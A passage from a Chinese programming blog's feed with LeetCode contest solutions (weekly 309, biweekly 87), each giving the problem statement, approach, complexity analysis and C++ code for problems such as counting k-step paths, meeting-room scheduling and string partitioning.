                   <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6168-恰好移动-k-步到达某一位置的方法数目"><a href="#6168-恰好移动-k-步到达某一位置的方法数目" class="headerlink" title="6168. 恰好移动 k 步到达某一位置的方法数目"></a>6168. 恰好移动 k 步到达某一位置的方法数目</h3><h4 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h4><p>给你两个 <strong>正</strong> 整数 <code>startPos</code> 和 <code>endPos</code> 。最初，你站在 <strong>无限</strong> 数轴上位置 <code>startPos</code> 处。在一步移动中，你可以向左或者向右移动一个位置。</p>
<p>给你一个正整数 <code>k</code> ，返回从 <code>startPos</code> 出发、<strong>恰好</strong> 移动 <code>k</code> 步并到达 <code>endPos</code> 的 <strong>不同</strong> 方法数目。由于答案可能会很大，返回对 <code>109 + 7</code> <strong>取余</strong> 的结果。</p>
<p>如果所执行移动的顺序不完全相同，则认为两种方法不同。</p>
<p><strong>注意：</strong>数轴包含负整数<strong>。</strong></p>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：startPos = 1, endPos = 2, k = 3</span><br><span class="line">输出：3</span><br><span class="line">解释：存在 3 种从 1 到 2 且恰好移动 3 步的方法：</span><br><span class="line">- 1 -&gt; 2 -&gt; 3 -&gt; 2.</span><br><span class="line">- 1 -&gt; 2 -&gt; 1 -&gt; 2.</span><br><span class="line">- 1 -&gt; 0 -&gt; 1 -&gt; 2.</span><br><span class="line">可以证明不存在其他方法，所以返回 3 。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：startPos = 2, endPos = 5, k = 10</span><br><span class="line">输出：0</span><br><span class="line">解释：不存在从 2 到 5 且恰好移动 10 步的方法。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= startPos, endPos, k &lt;= 1000</code></li>
</ul>
<h4 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-309/problems/number-of-ways-to-reach-a-position-after-exactly-k-steps/">https://leetcode.cn/contest/weekly-contest-309/problems/number-of-ways-to-reach-a-position-after-exactly-k-steps/</a></p>
<h4 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h4><pre><code>动态规划 + 数学方法
</code></pre>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ol>
<li>典型的动态规划解题思路即可。设 $dp[i][j]$ 表示第 $i$ 步在位置 $j$ 的方法数，则可以知道递推公式为:<br>$$<br>dp[i][j] &#x3D; dp[i-1][j-1] + dp[i-1][j + 1]。<br>$$<br>最终返回的结果即为 $dp[k][k + abs(endPos - startPos)]$。</li>
</ol>
<ul>
<li>我们可以很容易的分析出来当 $abs(endPos - startPos) &gt; k$ 时则无法达到目的地。</li>
</ul>
<ol start="2">
<li>数学方法：总共走了 $k$ 步，我们设从 $start \rightarrow end$ 为正方向，反向为负方向 $end \rightarrow start$，假设我们往正方向走了 $x$ 步，往负方向走了 $k - x$ 步，最终到达某个坐标，根据排列组合可以知道可能的方案数位 $C_k^x$，根据题意可以知道 $x - (k - x) &#x3D; end - start$，此时可以知道 $x &#x3D; \dfrac{k + end -start}{2}$，此时我们只需要求出 $C_k^x$ 即可，根据排列组合公式可知 $C_k^x &#x3D; C_{k-1}^{x-1} + C_{k-1}^{x}$，如果需要优化则可以利用乘法逆元进一步进行优化，可以在 $O(k)$ 的时间复杂度内求出结果。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(k^2)$，$k$ 表示给定的元素。</li>
<li>空间复杂度：空间复杂度为 $O(k)$。</li>
</ul>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">numberOfWays</span><span class="params">(<span class="type">int</span> startPos, <span class="type">int</span> endPos, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> mod = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line">        <span class="type">int</span> x = <span class="built_in">abs</span>(startPos - endPos);</span><br><span class="line">        vector&lt;vector&lt;<span class="type">long</span> <span class="type">long</span>&gt;&gt; <span class="built_in">dp</span>(k + <span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">long</span> <span class="type">long</span>&gt;(<span class="number">2</span>*k + <span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">        dp[<span class="number">0</span>][k] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= k; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= <span class="number">2</span> * k; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (dp[i<span class="number">-1</span>][j] != <span class="number">0</span>) &#123;</span><br><span class="line">                    dp[i][j + <span class="number">1</span>] = (dp[i][j + <span class="number">1</span>] + dp[i<span class="number">-1</span>][j]) % mod;</span><br><span class="line">                    dp[i][j - <span class="number">1</span>] = (dp[i][j - <span class="number">1</span>] + dp[i<span class="number">-1</span>][j]) % mod;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (x &gt; k) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[k][k+x];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>数学解法：<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">numberOfWays</span><span class="params">(<span class="type">int</span> startPos, <span class="type">int</span> endPos, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> x = <span class="built_in">abs</span>(endPos - startPos) + k;</span><br><span class="line">        <span class="keyword">if</span> (x % <span class="number">2</span> == <span class="number">1</span> || x &gt; <span class="number">2</span> * k) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        x = x / <span class="number">2</span>;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">comb</span>(k + <span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(x + <span class="number">1</span>));</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= x; i++) &#123;</span><br><span class="line">            comb[i][i] = <span class="number">1</span>;</span><br><span class="line">            comb[i][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> mod = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= k; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= x &amp;&amp; j &lt; i; j++) &#123;</span><br><span class="line">                comb[i][j] = (comb[i<span class="number">-1</span>][j<span class="number">-1</span>] + comb[i<span class="number">-1</span>][j]) % mod;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> comb[k][x];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="6169-最长优雅子数组"><a href="#6169-最长优雅子数组" class="headerlink" title="6169. 最长优雅子数组"></a>6169. 最长优雅子数组</h3><h4 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h4><p>给你一个由 <strong>正</strong> 整数组成的数组 <code>nums</code> 。</p>
<p>如果 <code>nums</code> 的子数组中位于 <strong>不同</strong> 位置的每对元素按位 <strong>与（AND）</strong>运算的结果等于 <code>0</code> ，则称该子数组为 <strong>优雅</strong> 子数组。</p>
<p>返回 <strong>最长</strong> 的优雅子数组的长度。</p>
<p><strong>子数组</strong> 是数组中的一个 <strong>连续</strong> 部分。</p>
<p><strong>注意：</strong>长度为 <code>1</code> 的子数组始终视作优雅子数组。</p>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [1,3,8,48,10]</span><br><span class="line">输出：3</span><br><span class="line">解释：最长的优雅子数组是 [3,8,48] 。子数组满足题目条件：</span><br><span class="line">- 3 AND 8 = 0</span><br><span class="line">- 3 AND 48 = 0</span><br><span class="line">- 8 AND 48 = 0</span><br><span class="line">可以证明不存在更长的优雅子数组，所以返回 3 。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [3,1,5,11,13]</span><br><span class="line">输出：1</span><br><span class="line">解释：最长的优雅子数组长度为 1 ，任何长度为 1 的子数组都满足题目条件。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= nums.length &lt;= 105</code></li>
<li><code>1 &lt;= nums[i] &lt;= 109</code></li>
</ul>
<h4 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-309/problems/longest-nice-subarray/">https://leetcode.cn/contest/weekly-contest-309/problems/longest-nice-subarray/</a></p>
<h4 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h4><pre><code>暴力判断
</code></pre>
<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ol>
<li>根据题目可以知道由于 <code>int</code> 整形最多只有 $32$ 个数组，因此我们直接检测连续的区间是否满足相与的情况即可，此时我们可以保存当前组中每个元素相或的结果 $x$，如果当前元素与 $x$ 相与的结果为 $0$，则表示 $x$ 与当前组中的任意元素相与都等于 $0$。</li>
<li>复杂度分析</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(n \times \log(\max(nums)))$，$n$ 为数组的长度。</li>
<li>空间复杂度：空间复杂度为 $O(1)$。</li>
</ul>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">longestNiceSubarray</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> curr = nums[i];</span><br><span class="line">            <span class="type">int</span> now = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = i + <span class="number">1</span>; j &lt; n &amp;&amp; (nums[j] &amp; curr) == <span class="number">0</span>; j++) &#123;</span><br><span class="line">                curr |= nums[j];</span><br><span class="line">                now++;</span><br><span class="line">            &#125;</span><br><span class="line">            ans = <span class="built_in">max</span>(ans, now);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6170-会议室-III"><a href="#6170-会议室-III" class="headerlink" title="6170. 会议室 III"></a>6170. 会议室 III</h3><h4 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h4><p>给你一个整数 <code>n</code> ，共有编号从 <code>0</code> 到 <code>n - 1</code> 的 <code>n</code> 个会议室。</p>
<p>给你一个二维整数数组 <code>meetings</code> ，其中 <code>meetings[i] = [starti, endi]</code> 表示一场会议将会在 <strong>半闭</strong> 时间区间 <code>[starti, endi)</code> 举办。所有 <code>starti</code> 的值 <strong>互不相同</strong> 。</p>
<p>会议将会按以下方式分配给会议室：</p>
<ol>
<li>每场会议都会在未占用且编号 <strong>最小</strong> 的会议室举办。</li>
<li>如果没有可用的会议室，会议将会延期，直到存在空闲的会议室。延期会议的持续时间和原会议持续时间 <strong>相同</strong> 。</li>
<li>当会议室处于未占用状态时，将会优先提供给原 <strong>开始</strong> 时间更早的会议。</li>
</ol>
<p>返回举办最多次会议的房间 <strong>编号</strong> 。如果存在多个房间满足此条件，则返回编号 <strong>最小</strong> 的房间。</p>
<p><strong>半闭区间</strong> <code>[a, b)</code> 是 <code>a</code> 和 <code>b</code> 之间的区间，<strong>包括</strong> <code>a</code> 但 <strong>不包括</strong> <code>b</code> 。</p>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：n = 2, meetings = [[0,10],[1,5],[2,7],[3,4]]</span><br><span class="line">输出：0</span><br><span class="line">解释：</span><br><span class="line">- 在时间 0 ，两个会议室都未占用，第一场会议在会议室 0 举办。</span><br><span class="line">- 在时间 1 ，只有会议室 1 未占用，第二场会议在会议室 1 举办。</span><br><span class="line">- 在时间 2 ，两个会议室都被占用，第三场会议延期举办。</span><br><span class="line">- 在时间 3 ，两个会议室都被占用，第四场会议延期举办。</span><br><span class="line">- 在时间 5 ，会议室 1 的会议结束。第三场会议在会议室 1 举办，时间周期为 [5,10) 。</span><br><span class="line">- 在时间 10 ，两个会议室的会议都结束。第四场会议在会议室 0 举办，时间周期为 [10,11) 。</span><br><span class="line">会议室 0 和会议室 1 都举办了 2 场会议，所以返回 0 。 </span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：n = 3, meetings = [[1,20],[2,10],[3,5],[4,9],[6,8]]</span><br><span class="line">输出：1</span><br><span class="line">解释：</span><br><span class="line">- 在时间 1 ，所有三个会议室都未占用，第一场会议在会议室 0 举办。</span><br><span class="line">- 在时间 2 ，会议室 1 和 2 未占用，第二场会议在会议室 1 举办。</span><br><span class="line">- 在时间 3 ，只有会议室 2 未占用，第三场会议在会议室 2 举办。</span><br><span class="line">- 在时间 4 ，所有三个会议室都被占用，第四场会议延期举办。 </span><br><span class="line">- 在时间 5 ，会议室 2 的会议结束。第四场会议在会议室 2 举办，时间周期为 [5,10) 。</span><br><span class="line">- 在时间 6 ，所有三个会议室都被占用，第五场会议延期举办。 </span><br><span class="line">- 在时间 10 ，会议室 1 和 2 的会议结束。第五场会议在会议室 1 举办，时间周期为 [10,12) 。 </span><br><span class="line">会议室 1 和会议室 2 都举办了 2 场会议，所以返回 1 。 </span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= n &lt;= 100</code></li>
<li><code>1 &lt;= meetings.length &lt;= 105</code></li>
<li><code>meetings[i].length == 2</code></li>
<li><code>0 &lt;= starti &lt; endi &lt;= 5 * 105</code></li>
<li><code>starti</code> 的所有值 <strong>互不相同</strong></li>
</ul>
<p>&#96;</p>
<h4 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-309/problems/meeting-rooms-iii/">https://leetcode.cn/contest/weekly-contest-309/problems/meeting-rooms-iii/</a></p>
<h4 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h4><pre><code>堆
</code></pre>
<h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><ol>
<li>我们采用优先队列来讲所有的房间都入队列，且每次队列中优先弹出结束时间最早的房间，相同的结束时间条件下，会弹出编号最小的房间。</li>
</ol>
<ul>
<li>首先按照会议开始时间的先后进行排序，我们每次从起始时间最早的会议开始检测</li>
<li>设当前队列中弹出的房间的结束时间为 $x$，则我们将所有结束时间小于 $x$ 的房间全部弹出，并以当前会议的起始时间为结束时间，再次将房间压入队列中；</li>
<li>队列中每次弹出的元素即为满足条件下，结束时间最早且编号最小的房间；</li>
<li>如果 $x$ 小于等于当前的结束</li>
</ul>
<ol start="2">
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(m \times \log n)$，其中 $m$ 表示数组的长度，$n$ 为房间数目。</li>
<li>空间复杂度：$(n)$，$n$ 为房间数目。</li>
</ul>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">mostBooked</span><span class="params">(<span class="type">int</span> n, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; meetings)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> m = meetings.<span class="built_in">size</span>();</span><br><span class="line">        <span class="built_in">sort</span>(meetings.<span class="built_in">begin</span>(), meetings.<span class="built_in">end</span>());</span><br><span class="line">        priority_queue&lt;pair&lt;<span class="type">long</span> <span class="type">long</span>, <span class="type">int</span>&gt;, vector&lt;pair&lt;<span class="type">long</span> <span class="type">long</span>, <span class="type">int</span>&gt;&gt;, greater&lt;pair&lt;<span class="type">long</span> <span class="type">long</span>, <span class="type">int</span>&gt;&gt;&gt; pq;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            pq.<span class="built_in">emplace</span>(<span class="number">0</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">cnt</span><span class="params">(n)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> v : meetings) &#123;</span><br><span class="line">            <span class="type">int</span> start = v[<span class="number">0</span>], end = v[<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">while</span> (pq.<span class="built_in">top</span>().first &lt; start) &#123;</span><br><span class="line">                <span class="type">int</span> x = pq.<span class="built_in">top</span>().second;</span><br><span class="line">                pq.<span class="built_in">pop</span>();</span><br><span class="line">                pq.<span class="built_in">emplace</span>(start, x);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">auto</span> [time, idx] = pq.<span class="built_in">top</span>();</span><br><span class="line">            pq.<span class="built_in">pop</span>();</span><br><span class="line">            cnt[idx]++;</span><br><span class="line">            <span class="keyword">if</span> (time &lt;= start) &#123;</span><br><span class="line">                pq.<span class="built_in">emplace</span>(end, idx);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                pq.<span class="built_in">emplace</span>(time + end - start, idx);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (cnt[i] &gt; cnt[ans]) &#123;</span><br><span class="line">                ans = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>力扣周赛</category>
      </categories>
      <tags>
        <tag>力扣周赛</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode biweekly contest 87</title>
    <url>/2022/11/01/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/33/</url>
    <content><![CDATA[<h2 id="leetcode-biweekly-contest-87"><a href="#leetcode-biweekly-contest-87" class="headerlink" title="leetcode biweekly contest 87"></a>leetcode biweekly contest 87</h2><p>今天周赛的题目质量还算蛮高，最后一题很少出线段树的模板题目了</p>
<h4 id="6176-出现最频繁的偶数元素"><a href="#6176-出现最频繁的偶数元素" class="headerlink" title="6176. 出现最频繁的偶数元素"></a>6176. 出现最频繁的偶数元素</h4><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>给你一个整数数组 <code>nums</code> ，返回出现最频繁的偶数元素。</p>
<p>如果存在多个满足条件的元素，只需要返回 <strong>最小</strong> 的一个。如果不存在这样的元素，返回 <code>-1</code> 。</p>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [0,1,2,2,4,4,1]</span><br><span class="line">输出：2</span><br><span class="line">解释：</span><br><span class="line">数组中的偶数元素为 0、2 和 4 ，在这些元素中，2 和 4 出现次数最多。</span><br><span class="line">返回最小的那个，即返回 2 。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [4,4,4,9,2,4]</span><br><span class="line">输出：4</span><br><span class="line">解释：4 是出现最频繁的偶数元素。</span><br></pre></td></tr></table></figure>

<p><strong>示例 3：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [29,47,21,41,13,37,25,7]</span><br><span class="line">输出：-1</span><br><span class="line">解释：不存在偶数元素。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= nums.length &lt;= 2000</code></li>
<li><code>0 &lt;= nums[i] &lt;= 105</code></li>
</ul>
<h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/most-frequent-even-element/">https://leetcode.cn/problems/most-frequent-even-element/</a></p>
<h4 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h4><pre><code>哈希统计
</code></pre>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>直接统计偶数元素的个数，并求出出现次数最多的偶数。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n)$，其中 $n$ 表示数组的长度。</li>
<li>空间复杂度：$O(n)$，其中 $n$ 表示数组的长度。</li>
</ul>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">mostFrequentEven</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        map&lt;<span class="type">int</span>,<span class="type">int</span>&gt; cnt;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> v : nums) &#123;</span><br><span class="line">            <span class="keyword">if</span> (v % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                cnt[v]++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">-1</span>, freq = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> [x, f] : cnt) &#123;</span><br><span class="line">            <span class="keyword">if</span> (f &gt; freq) &#123;</span><br><span class="line">                ans = x;</span><br><span class="line">                freq = f;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6177-子字符串的最优划分"><a href="#6177-子字符串的最优划分" class="headerlink" title="6177. 子字符串的最优划分"></a>6177. 子字符串的最优划分</h3><h4 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h4><p>给你一个字符串 <code>s</code> ，请你将该字符串划分成一个或多个 <strong>子字符串</strong> ，并满足每个子字符串中的字符都是 <strong>唯一</strong> 的。也就是说，在单个子字符串中，字母的出现次数都不超过 <strong>一次</strong> 。</p>
<p>满足题目要求的情况下，返回 <strong>最少</strong> 需要划分多少个子字符串<em>。</em></p>
<p>注意，划分后，原字符串中的每个字符都应该恰好属于一个子字符串。</p>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;abacaba&quot;</span><br><span class="line">输出：4</span><br><span class="line">解释：</span><br><span class="line">两种可行的划分方法分别是 (&quot;a&quot;,&quot;ba&quot;,&quot;cab&quot;,&quot;a&quot;) 和 (&quot;ab&quot;,&quot;a&quot;,&quot;ca&quot;,&quot;ba&quot;) 。</span><br><span class="line">可以证明最少需要划分 4 个子字符串。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;ssssss&quot;</span><br><span class="line">输出：6</span><br><span class="line">解释：</span><br><span class="line">只存在一种可行的划分方法 (&quot;s&quot;,&quot;s&quot;,&quot;s&quot;,&quot;s&quot;,&quot;s&quot;,&quot;s&quot;) 。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= s.length &lt;= 105</code></li>
<li><code>s</code> 仅由小写英文字母组成</li>
</ul>
<h4 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/optimal-partition-of-string/">https://leetcode.cn/problems/optimal-partition-of-string/</a></p>
<h4 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h4><pre><code>贪心 + 直接遍历
</code></pre>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ol>
<li>感觉没啥好说的，直接切分即可，遍历到字符出现多次的情形，则进行切分。根据贪心理论，两个相同的字符一定不能出现在不同的</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(n)$，$n$ 表示字符串的长度。</li>
<li>空间复杂度：空间复杂度为 $O(|\Sigma|)$，$|\Sigma|$ 表示字符集的大小。</li>
</ul>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">partitionString</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">cnt</span><span class="params">(<span class="number">26</span>)</span></span>;</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; s.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (cnt[s[i] - <span class="string">&#x27;a&#x27;</span>] == <span class="number">0</span>) &#123;</span><br><span class="line">                cnt[s[i] - <span class="string">&#x27;a&#x27;</span>]++;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                cnt = <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(<span class="number">26</span>);</span><br><span class="line">                ans++;</span><br><span class="line">                cnt[s[i] - <span class="string">&#x27;a&#x27;</span>]++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6178-将区间分为最少组数"><a href="#6178-将区间分为最少组数" class="headerlink" title="6178. 将区间分为最少组数"></a>6178. 将区间分为最少组数</h3><h4 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h4><p>给你一个二维整数数组 <code>intervals</code> ，其中 <code>intervals[i] = [lefti, righti]</code> 表示 <strong>闭</strong> 区间 <code>[lefti, righti]</code> 。</p>
<p>你需要将 <code>intervals</code> 划分为一个或者多个区间 <strong>组</strong> ，每个区间 <strong>只</strong> 属于一个组，且同一个组中任意两个区间 <strong>不相交</strong> 。</p>
<p>请你返回 <strong>最少</strong> 需要划分成多少个组。</p>
<p>如果两个区间覆盖的范围有重叠（即至少有一个公共数字），那么我们称这两个区间是 <strong>相交</strong> 的。比方说区间 <code>[1, 5]</code> 和 <code>[5, 8]</code> 相交。</p>
<p><strong>示例 1：</strong></p>
